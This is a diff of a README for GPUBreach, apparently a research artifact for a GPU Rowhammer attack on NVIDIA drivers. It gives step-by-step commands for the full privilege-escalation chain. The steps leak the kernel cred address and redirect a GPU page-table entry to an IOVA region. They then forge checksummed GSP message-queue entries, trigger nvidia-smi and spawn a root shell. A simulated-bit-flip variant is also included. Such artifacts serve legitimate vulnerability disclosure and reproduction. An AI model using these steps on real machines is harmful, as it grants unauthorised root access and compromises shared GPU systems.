@@ -254,7 +254,7 @@ NUMA:
 
 #### Step 0: Preparations
 
-##### Build the CPU-side exploit and load the credential structure dumping module
+**Dump the Cred Structure Address**
 
 This step gets the address of the `cred` structure. This is based on the exploit's assumption that a process's `cred` data structure can be leaked via other side-channels.
 
@@ -263,8 +263,9 @@ $ cd cred_mod/
 $ make
 $ sudo insmod get_cred_addr.ko
 ```
+**Build CPU-side exploit**
 
-Then, we build the CPU-side exploit components. `d_pattern.bin` generates a 1GB pattern file that will be used to fill GPU memory. The data pattern is used as identifying information for virtual pages, telling us which page have been remapped to point to the desired IOVA region. It will fill pages with unique "0x64" data, of which the gpubreach exploit will look for, allowing it to subsequently modify the page's PTE to the IOVA region. Having a larger pattern heuristically makes the lookup process faster.
+Next, we build the CPU-side exploit components. We also generate a file `d_pattern.bin` containing a 1GB data pattern of repeating "0x64", that will be filled in the GPU memory. This is pattern is used to identify the PA for a VA we control, and the associated PTE, which we will eventually redirect to the IOVA region. 
 
 ```bash
 $ cd d2h-tools/ # at gpubreach/
@@ -275,8 +276,10 @@ $ make -j
 ---
 
 #### Step 1: Perform GPUBreach
+This step will perform the GPU-side privilege escalation, find the candidate PTE of a VA we control to redirect the translation to point to a IOVA. 
 
-First execute the GPUBreach program designed for CPU-side exploit:
+**First, we execute the GPUBreach program designed for this exploit.**
+
 ```bash
 $ cd gpubreach
 $ python3 gpubreach.py app_cpu_exploit --n_step1 24109 --n_step3 24070 -t 0.2 -s 15
@@ -288,13 +291,15 @@ When corruption is successful, the program will pause and you will see the follo
 Press Enter Key to start finding and modifying that page's PTE.
 ```
 
-**On another terminal**, please execute the following which first loads the attacker memory with `0x6464646464646464`:
+**Next, we locate the PTE that we need to tamper to access the IOVA.**
+
+**On a second terminal**, please execute the following which first loads the attacker memory with `0x6464646464646464`:
 ```bash
 $ cd ./d2h-tools
 $ ./cpu-exploit/cpu-exploit ./d_pattern.bin
 ```
 
-Once the terminal appears, it means the data has been loaded. Now go back to GPUBreach’s terminal and **Press Enter Key**. On success, GPUBreach will print the text below:
+Once this creates a new terminal, it means the data has been loaded. Now go back to GPUBreach’s terminal (first terminal) and **Press Enter Key**. On success, GPUBreach will print the text below:
 ```text
 Found its PTE, modified your pointer's PTE to point to: 0x060000000fff0005
 Press Enter Key if you want to write 0x060000000ffe0005 instead.
@@ -302,22 +307,22 @@ Press Enter Key if you want to write 0x060000000ffe0005 instead.
 
 Note that the GPU's IOVA value is stable across runs and machines, always 0xffe41000 or 0xfff41000. Unforunately, we do not know which one is used on each bootup, so the attack may fail. Regardless, you may choose whether to write `0x060000000fff0005` or `0x060000000ffe0005` by following the instructions from the GPUBreach output.
 
-Now you are ready to move on to Step 4.
+Now you are ready to move on to Step 2.
 
 ---
 
-#### Step 4: Execute Privilege Escalation
+#### Step 2: Execute CPU Privilege Escalation
 
-In the command prompt that was opened using `./cpu-exploit` in either Step 2 or Step 3 (Case 2), run the following application commands step by step. Note that `>` means that these commands are run in the exploit's command prompt, not the regular shell.
+In the command prompt that was opened using `./cpu-exploit` (second terminal above), run the following application commands step by step. Note that `>` means that these commands are run in the exploit's command prompt, not the regular shell.
 
 ```bash
-> poc-init # Initializes the base of the buffer-under-operation by scanning the memory.
-> poc-cw-entry0-checksum # Scans the slots, discovers the current sequence numbers, and infers the next couple sequence numbers will be used. It then generates computes a the payloads indicating that there are 16 more messages followed by it with the correct checksum and writes them to the next entries where the POC predicts the GPU Driver will consume.
-> poc-privesc  # Escalates itself by overwriting the last message in the 17 messages with the constructed   GSP’s message queue with spawned threads
-> poc-trigger 5  # Executing nvidia-smi triggers CPU-GPU communication. It prompts the driver to process a message, advance the message queue, and consume the attacker-provided malicious payload.
+> poc-init # Initializes the base of the buffer under operation by scanning the memory.
+> poc-cw-entry0-checksum # Scans the slots, discovers the current sequence numbers, and infers the next couple sequence numbers that will be used. It then generates a payload indicating that there are 16 more messages followed by it with the correct checksum and writes them to the next entries which the POC predicts the GPU Driver will consume.
+> poc-privesc  # Overwrites the last message in the GSP’s message queue.
+> poc-trigger 5  # Executes nvidia-smi to trigger CPU-GPU communication. It prompts the driver to process a message, advance the message queue, and consume the attacker-provided malicious payload and escalate privileges.
 ```
 
-#### Step 5: Verify privilege escalation
+#### Step 3: Verify CPU privilege escalation
 
 You can now return go to the exploit's command prompt and check your privileges:
 
@@ -336,7 +341,7 @@ The effective UID of 0 indicates successful privilege escalation to root.
 
 If the Effective UID is not 0, the exploit has failed. You can try to execute `poc-trigger 5` again. **If still unsuccessful, you may need to reboot the machine using out-of-band methods and restart the exploit.**
 
-#### Step 6: Spawn root shell
+#### Step 4: Spawn root shell
 
 If the previous step has succeeded, use the `fork` command to spawn a root shell:
 
@@ -356,24 +361,27 @@ uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user),4(adm),24(cdrom),27
 
 You now have a root shell while starting as a regular user.
 
-#### Alternative Step 3: Exploit without GPUBreach
+#### Alternative Step 1: Exploit with simulated bit flips
 
-Given the scenario where we power cycle the machine (i.e. [Debugging Tips](#debugging-tips)) and bit-flips disappear for a while, one may attempt to perform the exploit without GPUBreach but with the `gpu-tlb` dumper instead.
+To reproduce only the driver-side vulnerability and CPU privilege escalation, we may attempt to perform the exploit by simulating the GPU-side privilege escalation without GPUBreach, but with the `gpu-tlb` dumper instead.
 
-First, run:
+> This is because sometimes the bit flips can disappear for a while, especially sometimes after we power cycle the machine (i.e. [Debugging Tips](#debugging-tips)).
+
+In one terminal, we execute:
 ```bash
+$ ./cpu-exploit/cpu-exploit ./d_pattern.bin  # Run this command as-is as a regular user with GPU access (non-root).
 $ cd d2h-tools
-$ ./cpu-exploit/cpu-exploit ./d_pattern.bin  # Run this command as-is as a regular user with GPU access (non-root). The exploit will later escalate privileges to root.
 ```
 
-Instead of using GPUBreach, open another terminal and we will simulate the arbitrary RW with the `simulate_rowhammer.sh` script. Modify the `IOVA_BASE` in `simulate_rowhammer.sh` to `0xfff00000` or `0xffe00000`.
+Instead of using GPUBreach, we will simulate the arbitrary RW with the `simulate_rowhammer.sh` script. Modify the `IOVA_BASE` in `simulate_rowhammer.sh` to `0xfff00000` or `0xffe00000`.
 
+In another terminal, we execute:
 ```bash
 $ cd d2h-tools/gpu_mem_dumper/scripts/
 $ sudo bash ./simulate_rowhammer.sh
 ``` 
 
-Now you can go back to step 4.
+Now you can go back to step 2 above.
 
 ### Debugging Tips
 
@@ -394,4 +402,4 @@ Now you can go back to step 4.
    bash run_regenerate_a1.sh
    ```
 
-   It will iteratively hammer and check whether bit-flip re-appeared. Unfortunately, when exactly it will re-appear is not know (may be a few minutes or hours). You may choose to wait a few hours or a day before restarting the process. For the CPU-GPU exploit, you may also go for the [Alternative Step 3](#alternative-step-3-exploit-without-gpubreach), given we already demonstrated arbitrary RW.
+   It will iteratively hammer and check whether bit-flip re-appeared. Unfortunately, when exactly it will re-appear is a bit variable (sometimes takes a few minutes). You may choose to wait a few hours before restarting the process. For the CPU-GPU exploit, you may also go to the [Alternative Step 1](#alternative-step-1-exploit-with-simulated-bit-flips), given we already demonstrated arbitrary RW.
